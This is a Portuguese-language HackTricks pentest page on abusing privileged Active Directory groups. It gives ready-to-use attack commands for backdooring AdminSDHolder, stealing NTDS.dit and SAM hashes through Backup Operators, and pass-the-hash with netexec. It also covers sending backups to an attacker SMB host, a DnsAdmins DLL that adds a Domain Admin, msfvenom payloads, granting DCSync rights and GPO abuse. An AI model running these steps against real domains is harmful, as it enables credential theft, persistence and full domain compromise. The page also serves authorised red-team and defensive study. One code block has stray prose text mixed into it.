# Grupos Privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos bem conhecidos com privilégios administrativos

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tem permissão para criar contas e grupos que não sejam administradores no domínio. Além disso, possibilita o login local no Controlador de Domínio (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Adicionar novos usuários é permitido, assim como login local no DC.

## Grupo AdminSDHolder

A Access Control List (ACL) do grupo **AdminSDHolder** é crucial, pois define permissões para todos os "grupos protegidos" dentro do Active Directory, incluindo grupos de alto privilégio. Esse mecanismo garante a segurança desses grupos impedindo modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do grupo **AdminSDHolder**, concedendo permissões totais a um usuário comum. Isso daria efetivamente a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário forem alteradas ou removidas, elas seriam automaticamente restabelecidas em até uma hora devido ao funcionamento do sistema.

A documentação recente do Windows Server ainda trata vários grupos operacionais integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). O processo **SDProp** é executado no **PDC Emulator** a cada 60 minutos por padrão, define `adminCount=1` e desabilita a herança nos objetos protegidos. Isso é útil tanto para persistência quanto para identificar usuários privilegiados obsoletos que foram removidos de um grupo protegido mas ainda mantêm a ACL sem herança.

Comandos para revisar os membros e modificar permissões incluem:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Um script está disponível para agilizar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

A associação a este grupo permite a leitura de objetos do Active Directory excluídos, o que pode revelar informações sensíveis:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Isto é útil para **recuperar caminhos de privilégios anteriores**. Objetos deletados ainda podem expor `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antigos, ou o DN de um grupo privilegiado deletado que pode ser posteriormente restaurado por outro operador.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acesso ao Controlador de Domínio

O acesso aos arquivos no Controlador de Domínio (DC) é restrito, a menos que o usuário faça parte do grupo `Server Operators`, que altera o nível de acesso.

### Escalada de Privilégios

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar permissões de serviços. O grupo `Server Operators`, por exemplo, tem controle total sobre certos serviços, permitindo a execução de comandos arbitrários e a escalada de privilégios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` têm acesso total, permitindo a manipulação de serviços para obter privilégios elevados.

## Backup Operators

A filiação no grupo `Backup Operators` fornece acesso ao sistema de arquivos do `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem percorrer pastas, listar e copiar arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para esse processo.

Para listar os membros do grupo, execute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

Para aproveitar esses privilégios localmente, os seguintes passos são empregados:

1. Importe as bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ative e verifique `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acessar e copiar arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque AD

O acesso direto ao sistema de arquivos do Controlador de Domínio permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM de usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Crie uma cópia sombra do disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copie `NTDS.dit` da shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrair `SYSTEM` e `SAM` para recuperação de hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupere todos os hashes do `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Pós-extração: Pass-the-Hash para DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Usando wbadmin.exe

1. Configure o sistema de arquivos NTFS para o servidor SMB na máquina atacante e armazene em cache as credenciais SMB na máquina alvo.
2. Use `wbadmin.exe` para backup do sistema e extração do `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para uma demonstração prática, veja [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios SYSTEM em um servidor DNS, frequentemente hospedado em Controladores de Domínio. Essa capacidade permite potencial de exploração significativo.

Para listar os membros do grupo DnsAdmins, use:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidade permite a execução de código arbitrário com privilégios SYSTEM no serviço DNS (normalmente dentro dos DCs). Esse problema foi corrigido em 2021.

Membros podem fazer o servidor DNS carregar uma DLL arbitrária (seja localmente ou de um compartilhamento remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para mais detalhes sobre este vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é viável usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para mais informações.

### WPAD Record for MitM

DnsAdmins podem manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desabilitar a global query block list. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.

### Event Log Readers
Membros podem acessar logs de eventos, potencialmente encontrando informações sensíveis como senhas em texto simples ou detalhes de execução de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo pode modificar DACLs no objeto de domínio, potencialmente concedendo privilégios DCSync. Técnicas de elevação de privilégios que exploram este grupo estão detalhadas no repositório Exchange-AD-Privesc no GitHub.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Se você puder agir como membro deste grupo, o abuso clássico é conceder a um principal controlado pelo atacante os direitos de replicação necessários para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historicamente, **PrivExchange** encadeava acesso a caixas de correio, coerced Exchange authentication e LDAP relay para chegar a esse mesmo primitivo. Mesmo quando esse caminho de relay é mitigado, a associação direta ao `Exchange Windows Permissions` ou o controle de um Exchange server continua sendo uma via de alto valor para direitos de replicação de domínio.

## Administradores do Hyper-V

Administradores do Hyper-V têm acesso total ao Hyper-V, que pode ser explorado para obter controle sobre Domain Controllers virtualizados. Isso inclui clonar live DCs e extrair hashes NTLM do arquivo `NTDS.dit`.

### Exemplo de Exploração

O abuso prático costuma ser **acesso offline aos discos/checkpoints de DC** em vez das velhas artimanhas de LPE a nível de host. Com acesso ao Hyper-V host, um operador pode criar um checkpoint ou exportar um Domain Controller virtualizado, montar o VHDX, e extrair `NTDS.dit`, `SYSTEM`, e outros segredos sem tocar no LSASS dentro do guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
A partir daí, reutilize o workflow `Backup Operators` para copiar `Windows\NTDS\ntds.dit` e os hives do registro offline.

## Group Policy Creators Owners

Este grupo permite que seus membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar Group Policies a usuários ou grupos, nem editar GPOs existentes.

A nuance importante é que o **criador torna-se o proprietário do novo GPO** e normalmente obtém direitos suficientes para editá-lo posteriormente. Isso significa que esse grupo é interessante quando você pode:

- criar um GPO malicioso e convencer um administrador a vinculá-lo a uma OU/domain alvo
- editar um GPO que você criou e que já está vinculado em algum lugar útil
- abusar de outro direito delegado que permita vincular GPOs, enquanto esse grupo lhe dá a parte de edição

O abuso prático normalmente significa adicionar uma **Immediate Task**, **startup script**, **local admin membership**, ou alteração de **user rights assignment** através de arquivos de política suportados por SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Se editar a GPO manualmente através de `SYSVOL`, lembre-se de que a alteração não é suficiente por si só: `versionNumber`, `GPT.ini`, e, às vezes, `gPCMachineExtensionNames` também devem ser atualizados ou os clientes ignorarão a atualização da política.

## Organization Management

Em ambientes onde o **Microsoft Exchange** está implantado, um grupo especial conhecido como **Organization Management** possui capacidades significativas. Esse grupo tem privilégio para **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre a 'Microsoft Exchange Security Groups'** Unidade Organizacional (OU). Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para elevação de privilégio.

### Privilege Exploitation and Commands

#### Print Operators

Membros do grupo **Print Operators** possuem vários privilégios, incluindo o **`SeLoadDriverPrivilege`**, que lhes permite **fazer logon localmente em um Domain Controller**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se o **`SeLoadDriverPrivilege`** não for visível em um contexto sem elevação, é necessário contornar o User Account Control (UAC).

Para listar os membros desse grupo, o seguinte comando PowerShell é usado:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Em Domain Controllers esse grupo é perigoso porque a Domain Controller Policy padrão concede **`SeLoadDriverPrivilege`** aos `Print Operators`. Se você obtiver um token elevado de um membro desse grupo, pode habilitar o privilégio e carregar um driver assinado, porém vulnerável, para obter acesso ao kernel/SYSTEM. Para detalhes sobre manipulação de tokens, consulte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Os membros deste grupo têm acesso a PCs via Remote Desktop Protocol (RDP). Para enumerar esses membros, comandos PowerShell estão disponíveis:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre a exploração de RDP podem ser encontradas em recursos dedicados de pentesting.

#### Usuários de Gerenciamento Remoto

Membros podem acessar PCs através de **Windows Remote Management (WinRM)**. A enumeração desses membros é realizada através de:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, consulte a documentação específica.

#### Operadores de Servidores

Este grupo tem permissões para executar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alterar a hora do sistema e desligar o sistema. Para enumerar os membros, o comando fornecido é:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Nos Controladores de Domínio, `Server Operators` comumente herdam direitos suficientes para **reconfigurar ou iniciar/parar serviços** e também recebem `SeBackupPrivilege`/`SeRestorePrivilege` pela política padrão do DC. Na prática, isso os torna uma ponte entre **service-control abuse** e **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Se a ACL do serviço conceder a este grupo direitos de alteração/início, aponte o serviço para um comando arbitrário, inicie-o como `LocalSystem` e depois restaure o `binPath` original. Se o controle de serviços estiver bloqueado, recorra às técnicas de `Backup Operators` acima para copiar `NTDS.dit`.

## Referências <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
